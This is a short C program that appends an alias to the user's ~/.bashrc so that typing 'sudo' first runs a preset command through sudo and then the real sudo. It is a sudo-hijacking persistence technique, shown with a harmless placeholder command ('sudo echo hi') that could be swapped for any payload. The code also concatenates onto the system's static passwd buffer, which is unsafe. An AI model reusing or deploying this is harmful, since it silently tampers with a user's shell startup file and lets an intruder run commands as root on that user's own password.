#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<pwd.h>
#include<sys/types.h>

#define SUDO_COMMAND "sudo echo hi"

int main(){
	//Get passwd entry, which includes the users homedirectory
	struct passwd *passwd_entry = getpwuid(getuid());
	char* path = passwd_entry->pw_dir;

	//Add /.bashrc to path
	strcat(path,"/.bashrc");

	printf("%s\n",path);

	//Open /.bashrc
	FILE *writer = fopen(path,"a");

	//Creates alias to run SUDO_COMMAND as sudo
	fputs("alias sudo=\'",writer);
	fputs(SUDO_COMMAND,writer);
	fputs("; sudo\'\n",writer);
}
